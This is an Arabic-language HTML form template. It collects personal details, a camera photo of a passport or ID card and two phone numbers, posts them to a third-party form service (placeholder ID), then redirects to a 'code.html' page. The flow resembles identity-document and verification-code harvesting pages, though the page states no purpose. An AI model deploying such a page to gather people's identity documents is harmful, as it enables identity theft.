<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>نموذج البيانات</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 30px;
      direction: rtl;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 10px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    button {
      background: #4CAF50;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background: #45a049;
    }
    #videoContainer, #canvasContainer {
      display: none;
      text-align: center;
      margin-top: 10px;
    }
    video, canvas {
      width: 100%;
      border-radius: 10px;
      max-height: 300px;
    }
    .camera-btn {
      background: #444;
      margin-top: 10px;
    }
  </style>
</head>
<body>

<form id="mainForm" action="https://formcarry.com/s/YOUR_FORM_ID" method="POST" enctype="multipart/form-data">
  <h2>نموذج البيانات</h2>
  <label>الاسم الثلاثي:</label>
  <input type="text" name="full_name" required>

  <label>اللقب:</label>
  <input type="text" name="last_name" required>

  <label>تاريخ الميلاد:</label>
  <input type="date" name="birth_date" required>

  <label>الجنس:</label>
  <select name="gender" required>
    <option value="">-- اختر --</option>
    <option value="ذكر">ذكر</option>
    <option value="أنثى">أنثى</option>
  </select>

  <label>المستوى الدراسي:</label>
  <select name="education_level" required>
    <option value="">-- اختر --</option>
    <option value="إعدادي">إعدادي</option>
    <option value="ثانوي">ثانوي</option>
    <option value="جامعي">جامعي</option>
  </select>

  <label>نوع المستند:</label>
  <select name="document_type" id="documentType" required>
    <option value="">-- اختر --</option>
    <option value="جواز سفر">جواز سفر</option>
    <option value="بطاقة شخصية">بطاقة شخصية</option>
  </select>

  <button type="button" class="camera-btn" onclick="startCamera()">📷 فتح الكاميرا</button>

  <div id="videoContainer">
    <video id="video" autoplay></video>
    <button type="button" class="camera-btn" onclick="capturePhoto()">📸 التقط الصورة</button>
  </div>

  <div id="canvasContainer">
    <canvas id="canvas"></canvas>
  </div>

  <input type="hidden" name="document_image" id="documentImageInput">

  <label>رقم الهاتف:</label>
  <input type="tel" name="phone" required>

  <label>رقم هاتف احتياطي:</label>
  <input type="tel" name="backup_phone" required>

  <button type="submit" onclick="goToCodePage(event)">التالي</button>
</form>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const videoContainer = document.getElementById('videoContainer');
  const canvasContainer = document.getElementById('canvasContainer');
  const documentImageInput = document.getElementById('documentImageInput');

  let stream;

  function startCamera() {
    videoContainer.style.display = "block";
    canvasContainer.style.display = "none";

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(s => {
        stream = s;
        video.srcObject = stream;
      })
      .catch(err => {
        alert("حدث خطأ أثناء الوصول إلى الكاميرا: " + err.message);
      });
  }

  function capturePhoto() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    canvasContainer.style.display = "block";

    // تحويل الصورة إلى base64 وتخزينها
    const imageData = canvas.toDataURL("image/png");
    documentImageInput.value = imageData;

    // إيقاف الكاميرا بعد الالتقاط
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
    videoContainer.style.display = "none";
  }

  function goToCodePage(event) {
    event.preventDefault();
    const form = document.getElementById('mainForm');

    fetch(form.action, {
      method: 'POST',
      body: new FormData(form),
      headers: { 'Accept': 'application/json' }
    }).then(response => {
      if (response.ok) {
        window.location.href = "code.html";
      } else {
        alert("فشل في الإرسال. حاول مرة أخرى.");
      }
    });
  }
</script>

</body>
</html>
